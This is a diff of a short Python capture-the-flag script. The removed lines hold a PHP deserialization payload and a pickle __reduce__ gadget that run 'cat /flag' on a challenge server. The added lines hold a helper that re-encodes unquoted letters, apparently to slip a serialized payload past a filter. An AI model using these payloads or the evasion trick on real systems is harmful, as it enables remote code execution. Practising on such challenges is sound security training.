@@ -1,15 +1,22 @@
-import requests
+import re
 
-url = "http://challenge.bluesharkinfo.com:28995/index.php"
+def replace_unquoted(text):
+    pattern = r'(\'.*?\'|\".*?\")|([oa])'
+    
+    def replacement(match):
+        if match.group(1):
+            return match.group(1)
+        else:
+            char = match.group(2)
+            replacements = {
+                'o': '%ba',
+                'a': '%aa',
+            }
+            return replacements.get(char, char)
+    
+    result = re.sub(pattern, replacement, text)
+    return result
 
-# 假设有 Shark 类，private 属性 cmd，__wakeup 执行 system
-import pickle
-class Exploit:
-    def __reduce__(self):
-        import os
-        return (os.system, ("cat /flag*",))
-
-# 或者直接字符串
-payload = "blueshark:O:5:\"Shark\":1:{s:11:\"\0Shark\0cmd\";s:9:\"cat /flag\";}" + "A"*7340032
-
-requests.post(url, data={"shark": payload})
+input_text = '' # payload
+output_text = replace_unquoted(input_text)
+print("处理后的字符串:", output_text)
